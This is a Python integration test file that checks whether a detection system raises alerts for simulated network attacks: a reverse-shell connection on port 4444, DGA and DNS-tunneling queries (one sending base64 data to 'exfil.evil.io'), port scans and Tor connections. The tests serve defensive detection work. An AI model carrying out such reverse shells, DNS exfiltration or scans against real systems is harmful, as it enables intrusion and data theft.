"""
Integration tests: network-based detection rules.

Tests TCP connect, DNS DGA, and port-scan detection.
"""

import pytest
from attacks.net_attacks import (
    connect_reverse_shell,
    dns_dga_query,
    dns_tunneling_query,
    mass_port_scan,
    connect_tor_port,
)


pytestmark = pytest.mark.integration


def test_reverse_shell_port_4444_fires_alert(alerts):
    proc = connect_reverse_shell(port=4444)
    pid  = proc.pid
    proc.wait(timeout=5)

    alert = alerts.wait_for_alert(
        rule_id="reverse_shell_connect",
        pid=pid,
        timeout=5,
    )
    assert alert.severity in ("warning", "critical")


def test_dga_dns_query_fires_alert(alerts):
    proc = dns_dga_query("xf3k2mnbvqzr1pwjk.io")
    pid  = proc.pid
    proc.wait(timeout=5)

    alert = alerts.wait_for_alert(
        rule_id="dns_dga_query",
        pid=pid,
        timeout=5,
    )
    assert alert.pid == pid


def test_dns_tunneling_long_subdomain_fires_alert(alerts):
    proc = dns_tunneling_query("aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.exfil.evil.io")
    pid  = proc.pid
    proc.wait(timeout=5)

    alert = alerts.wait_for_alert(
        predicate=lambda a: "dns" in a.rule_id.lower() or "tunnel" in a.rule_id.lower(),
        pid=pid,
        timeout=5,
    )
    assert alert.pid == pid


def test_port_scan_fires_alert(alerts):
    proc = mass_port_scan(ports=50)
    pid  = proc.pid
    proc.wait(timeout=10)

    alert = alerts.wait_for_alert(
        predicate=lambda a: "scan" in a.rule_id.lower() or "recon" in a.rule_id.lower(),
        pid=pid,
        timeout=10,
    )
    assert alert.pid == pid


def test_tor_port_connection_fires_alert(alerts):
    proc = connect_tor_port()
    pid  = proc.pid
    proc.wait(timeout=5)

    alert = alerts.wait_for_alert(
        predicate=lambda a: "tor" in a.rule_id.lower() or "c2" in a.rule_id.lower(),
        pid=pid,
        timeout=5,
    )
    assert alert.pid == pid


def test_normal_http_connection_does_not_fire(alerts):
    import subprocess
    # connect to port 80 — should not trigger reverse_shell_connect
    proc = subprocess.Popen(
        ["python3", "-c",
         "import socket; s=socket.socket(); s.settimeout(0.5); "
         "s.connect_ex(('127.0.0.1', 80)); s.close()"],
        stderr=subprocess.DEVNULL,
    )
    pid = proc.pid
    proc.wait(timeout=5)

    alerts.wait_for_no_alert(rule_id="reverse_shell_connect", pid=pid, window=2)
